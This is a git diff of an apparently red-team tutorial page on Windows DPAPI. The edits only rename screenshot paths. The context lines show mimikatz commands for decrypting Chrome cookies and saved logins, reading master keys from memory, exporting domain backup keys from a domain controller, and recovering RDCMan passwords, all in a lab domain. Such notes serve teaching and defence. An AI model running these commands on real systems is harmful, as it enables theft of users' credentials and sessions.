@@ -24,7 +24,7 @@ dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 15-31-49.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-15-31-49.png)
 
 Or Chrome's saved credentials:
 
@@ -34,7 +34,7 @@ dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /u
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 15-34-29.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-15-34-29.png)
 
 ## Protecting and Unprotecting Data
 
@@ -46,7 +46,7 @@ dpapi::protect /data:"spotless"
 ```
 {% endcode %}
 
-![text "spotless" encrypted into a blob of bytes](<../../.gitbook/assets/Screenshot from 2019-04-13 15-42-36.png>)
+![text "spotless" encrypted into a blob of bytes](../../.gitbook/assets/screenshot-from-2019-04-13-15-42-36.png)
 
 Let's copy/paste the blob into a new file in HxD and save it as `spotless.bin`. To decrypt it while running under `mantvydas` user context:
 
@@ -54,7 +54,7 @@ Let's copy/paste the blob into a new file in HxD and save it as `spotless.bin`. 
 dpapi::blob /in:"c:\users\mantvydas\desktop\spotless.bin" /unprotect
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 15-43-02.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-15-43-02.png)
 
 ## Decrypting Other User's Secrets
 
@@ -70,7 +70,7 @@ dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Da
 
 As mentioned, we see an error message suggesting `CryptUnprotectData` is having some issues decrypting the requested secrets:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 15-55-38.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-15-55-38.png)
 
 If you escalated privilges, you can try looking for the master key in memory:
 
@@ -82,7 +82,7 @@ sekurlsa::dpapi
 
 We see there is the master key for user `spotless`:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 16-03-34.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-16-03-34.png)
 
 Let's now use that master key for `spotless` to decrypt those Chrome secrets we could not earlier:
 
@@ -92,7 +92,7 @@ dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Da
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 16-05-55.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-16-05-55.png)
 
 Additionally, note that if the user is not logged on, but you have their password, just spawn a process with their creds and repeat the above steps to retrieve their secrets.
 
@@ -106,7 +106,7 @@ dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protec
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 18-02-42.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-18-02-42.png)
 
 ## Extracting DPAPI Backup Keys with Domain Admin
 
@@ -120,7 +120,7 @@ lsadump::backupkeys /system:dc01.offense.local /export
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 16-57-55.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-16-57-55.png)
 
 Using the retrieved backup key, let's decrypt user's `spotless` master key:
 
@@ -130,7 +130,7 @@ dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protec
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 17-11-48.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-17-11-48.png)
 
 We can now decrypt user's `spotless` chrome secrets using their decrypted master key:
 
@@ -140,7 +140,7 @@ dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Da
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 17-16-47.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-17-16-47.png)
 
 ## Using DPAPIs to Encrypt / Decrypt Data in C++
 
@@ -173,7 +173,7 @@ int main()
 
 Below is a comparison between the blobs for the data `spotless` created with mimikatz and my c++:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 20-30-47.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-20-30-47.png)
 
 We can now try to decrypt our binary blob file using mimikatz as we did earlier with:
 
@@ -183,7 +183,7 @@ dpapi::blob /in:"c:\users\mantvydas\desktop\encrypted.bin" /unprotect
 
 
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 20-31-58.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-20-31-58.png)
 
 We can see the decryption produced the following output:
 
@@ -236,7 +236,7 @@ int main()
 
 We can see that the decryption was successful:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-13 21-21-26.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-13-21-21-26.png)
 
 ### Decrypting Remote Desktop Connection Manager Passwords from .rdg
 
@@ -244,11 +244,11 @@ It's possible to decrypt passwords from an .rdg file that is used by Remote Desk
 
 I have saved one connection to `DC01.offense.local` using credentials `offense\administrator` with a password `123456` (RDCMan for security reasons show a more than 6 start in the picture) into a file `spotless.rdg`:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-45-00.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-17-19-45-00.png)
 
 If we look at he `spotless.rdg`, we can see one our admin credentials stored (username in plaintext) and the password in base64:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-45-47.png>)
+![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-45-47 (1).png>)
 
 Let's decode the base64:
 
@@ -258,15 +258,15 @@ echo AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA0odLHavOPUOnyENNv8ru+gAAAAACAAAAAAAQZgAAAAE
 
 Below shows a binary blob from `spotless.bin` we played with earlier (top screen) and the decoded base64 string (bottom screen). Note how the first 62 bytes match - this is a clear giveaway that the .rdg password is encrypted using DPAPI:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-52-36.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-17-19-52-36.png)
 
 Let's copy the hex bytes of the decoded base64 string found in `spotless.rdg` and save it as a binary file `spotless.rdg.bin` and try to decode it using the code we played with earlier:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-58-54.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-17-19-58-54.png)
 
 We can see that we were able to successfully decrypt the RDP password stored in `spotless.rdg`:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-17 20-05-04.png>)
+![](../../.gitbook/assets/screenshot-from-2019-04-17-20-05-04.png)
 
 Same technique could be used to decrypt Chrome's cookies/logins, wifi passwords and whatever else Windows stores encrypted with DPAPI.
 
